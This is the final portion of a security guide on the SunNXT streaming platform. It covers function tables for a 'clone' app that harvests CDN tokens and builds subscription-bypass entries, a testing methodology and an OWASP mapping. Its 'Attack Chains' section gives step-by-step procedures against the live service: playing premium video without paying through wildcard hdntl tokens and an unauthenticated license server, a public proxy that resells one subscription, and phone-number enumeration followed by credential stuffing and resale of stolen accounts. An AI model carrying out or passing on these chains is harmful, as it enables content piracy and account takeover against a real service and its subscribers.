|---|---|
| `buildBypassEntries(contentId)` | Returns CDN video entries from UUID+hdntl if both available |
| `extractAndCacheHdntl(entries)` | Scans video entry URLs for hdntl, saves to cache + disk |
| `learnUuidsFromEntries(contentId, entries)` | Extracts UUID from CDN URLs, adds to UUID_DB |
| `getCachedHdntl()` | Returns cached hdntl token if not expired |
| `seedFromToken(token, source)` | Validates expiry, saves to memory + disk |
| `loadCacheFromDisk()` | Reads $TMPDIR/sunnxt-hdntl.json, returns if valid |
| `saveCacheToDisk(cache)` | Writes hdntl to $TMPDIR/sunnxt-hdntl.json |

### `lib/sunnxt-session.ts`

| Function | What It Does |
|---|---|
| `getSunnxtCookies()` | Returns cached cookie string or re-authenticates |
| `invalidateSession()` | Clears the in-memory session cache |
| `forceRelogin()` | Clears cache and immediately re-authenticates |
| `performLogin()` | Calls SunNXT login API, caches result |

### `app/api/media/[contentId]/route.ts`

| Function | What It Does |
|---|---|
| `decrypt(response)` | AES-128-CBC decrypt using static key |
| `hasVideos(data)` | Checks if response has playable video entries |
| `getVideosError(data)` | Extracts subscription error message |
| `getRoamingError(data)` | Detects geo-block response |
| `harvestBypassData(contentId, data)` | Calls extractAndCacheHdntl + learnUuidsFromEntries |
| `normalizeVideos(data)` | Ensures all video links are absolute URLs |
| `buildBypassResponse(contentId, entries, originalData)` | Merges bypass entries with original metadata |

---

## 16. Security Testing Methodology

### Phase 1: Reconnaissance (Passive)

```
1. Open the platform in Chrome with DevTools (F12) → Network tab
2. Record all requests during: page load, login, browse, play
3. Sources tab: search JS files for:
   - "secret", "key", "token", "encrypt", "CryptoJS", "AES"
   - Long base64 strings: [A-Za-z0-9+/=]{20,}
   - UUID patterns: [0-9a-f]{8}-[0-9a-f]{4}-...
4. Application tab: Cookies, LocalStorage, SessionStorage
5. Save as HAR file for offline analysis
```

### Phase 2: Authentication Testing

```
Test 1: Rate limiting on login
  → Submit 20+ failed logins rapidly
  → Expect: 429 after 5-10 attempts
  → If no throttle → VULN-10

Test 2: Session expiry
  → Login → save sessionid cookie
  → Wait 24h → use saved cookie
  → If still valid → VULN-04

Test 3: Credential encryption
  → Intercept login request body
  → Search JS for encryption logic
  → If key found in client code → VULN-01
```

### Phase 3: Authorization Testing

```
Test 1: Subscription bypass
  → As unsubscribed user: GET /api/media/<premium-content-id>
  → If video URLs returned → missing subscription check

Test 2: Session sharing
  → Without logging in: GET /api/stream-proxy?url=<cdn-url>
  → If content served → VULN-16

Test 3: Phone enumeration
  → Without auth: GET /api/auth/status?mobile=<any-phone>
  → If returns user_available/subscription_status → VULN-15

Test 4: Clear session
  → Without auth: GET /api/auth/clear-session
  → If returns ok:true → VULN-14
```

### Phase 4: DRM Testing

```
Test 1: License endpoint auth
  → POST to modularLicense without any headers
  → First byte of response: 0x7B (error) or 0x12 (valid key)?
  → If 0x12 → VULN-11

Test 2: License reuse
  → Capture a valid license response binary
  → POST same challenge again within minutes
  → If accepted → maxUses > 1 → VULN-08

Test 3: CDN token scope
  → Extract hdntl from one content's URL
  → Use it to access a different content's CDN URL
  → If it works → acl=/* wildcard → VULN-06
```

### Phase 5: CDN Analysis

```
1. Save CDN URLs from HAR file
2. Extract UUID patterns: /movies1/([0-9a-f]{32})/
3. Test UUID permanence: revisit same URL after 1 week
4. Extract hdntl token: ?hdntl=([^&]+)
5. Test hdntl scope: use one content's token on another content
6. Test token persistence: does token work 20+ hours later?
```

---

## 17. OWASP Top 10 Mapping

| OWASP 2021 | Category | SunNXT Findings |
|---|---|---|
| A01 | Broken Access Control | VULN-03, VULN-05, VULN-07, VULN-14, VULN-15, VULN-16, VULN-17 |
| A02 | Cryptographic Failures | VULN-01, VULN-02, VULN-18 |
| A03 | Injection | VULN-17, VULN-19 |
| A04 | Insecure Design | VULN-06, VULN-12, VULN-20 |
| A05 | Security Misconfiguration | VULN-09, VULN-14 |
| A06 | Vulnerable Components | N/A |
| A07 | Authentication Failures | VULN-04, VULN-08, VULN-10, VULN-11 |
| A08 | Software Integrity Failures | VULN-13 |
| A09 | Logging Failures | VULN-09 |
| A10 | SSRF | N/A (our proxy, not SunNXT's) |

### Most Critical by OWASP Category

**A07 (Auth Failures):** VULN-11 is the highest-impact instance — the DRM license server's failure to authenticate is a complete bypass of the last security layer.

**A01 (Broken Access Control):** VULN-16 is the most immediately exploitable — the stream proxy shares server subscription credentials with unauthenticated users.

**A04 (Insecure Design):** VULN-06 + VULN-20 represent a fundamental architecture flaw — CDN tokens that are wildcard-scoped and self-refreshing cannot be effectively revoked per-user.

---

## 18. Attack Chains

### Chain A: Full Content Access Without Subscription

**Who can do this:** Any person with a free SunNXT account  
**Time to execute:** ~10 minutes  
**Persistence:** Permanent (after initial setup)

```
Step 1: Log into free SunNXT account
Step 2: Watch any free content (triggers hdntl token in cookies)
Step 3: Open DevTools → Application → Cookies → copy hdntl value
Step 4: Check UUID_DB for target content ID, or learn UUID from:
         GET /api/media/<contentId> with free session → parse CDN URL
Step 5: Construct CDN URL:
         https://movies1-suntvvod1.akamaized.net/movies1/<UUID>/auto/index.mpd?hdntl=<token>
Step 6: Load URL in browser with Shaka → PSSH triggers Widevine challenge
Step 7: Challenge auto-posted to modularLicense (no auth — VULN-11)
Step 8: License issued → content decrypts → premium content plays
Step 9: As long as free content is occasionally watched,
         hdntl auto-refreshes → permanent access
```

**Vulnerabilities:** VULN-06, VULN-11, VULN-12, VULN-20

### Chain B: Zero-Credential Premium Gateway

**Who can do this:** Anyone with the clone URL  
**Time to execute:** < 1 minute  
**Requires:** Deployed clone with SUNNXT_USERID configured

```
Step 1: Find the deployed clone URL (public deployment)
Step 2: Get any CDN URL (from search results, known UUID, or HAR file)
Step 3: curl -s "https://clone.vercel.app/api/stream-proxy?url=<cdn-url>"
Step 4: Receive video segment data authenticated with server's subscription
Step 5: No login, no payment, no credentials needed
```

**Vulnerability:** VULN-16

### Chain C: Subscriber Database + Credential Stuffing

**Who can do this:** Anyone with a phone number list  
**Time to execute:** Hours (thousands of numbers)

```
Step 1: Obtain Indian phone number list (public databases, data leaks)
Step 2: Enumerate each number:
         GET /api/auth/status?mobile=<phone>
         Filter: user_available=true AND subscription_status=active
Step 3: Build list of confirmed active subscribers
Step 4: Credential stuff against confirmed accounts:
         POST /api/auth/login with phone + leaked passwords
         (No rate limiting — VULN-10)
Step 5: On success: stolen account with active subscription
         Sell access, change password, or use subscription
```

**Vulnerabilities:** VULN-15, VULN-10

---

## 19. Glossary

| Term | Definition |
|---|---|
| **CENC** | Common Encryption — DRM encryption standard used in DASH |
| **CDN** | Content Delivery Network — servers distributed globally to serve video |
| **CDM** | Content Decryption Module — browser component handling DRM (protected hardware) |
| **CORS** | Cross-Origin Resource Sharing — browser security policy for cross-domain requests |
| **DASH** | Dynamic Adaptive Streaming over HTTP — the main video streaming protocol |
| **DRM** | Digital Rights Management — system to control content access/copying |
| **EME** | Encrypted Media Extensions — browser API for DRM integration |
| **HAR** | HTTP Archive — file format capturing all HTTP requests/responses |
| **hdnea** | Akamai EdgeAuth 1.0 token — per-content CDN authentication |
| **hdntl** | Akamai EdgeToken Lite 2.0 token — wildcard CDN authentication |
| **HLS** | HTTP Live Streaming — Apple's streaming protocol (`.m3u8` manifests) |
| **IV** | Initialization Vector — random value used in block cipher encryption |
| **MPD** | Media Presentation Description — DASH manifest file |
| **OWASP** | Open Web Application Security Project — web security standards body |
| **PlayReady** | Microsoft DRM system |
| **PSSH** | Protection System Specific Header — DRM bootstrap box in video segments |
| **PKCS7** | Padding scheme for block ciphers |
| **UUID** | Universally Unique Identifier — permanent ID for CDN content paths |
| **Widevine** | Google DRM system — most common in web browsers |

---

*Complete guide by Nitheesh D R — May 23, 2026*
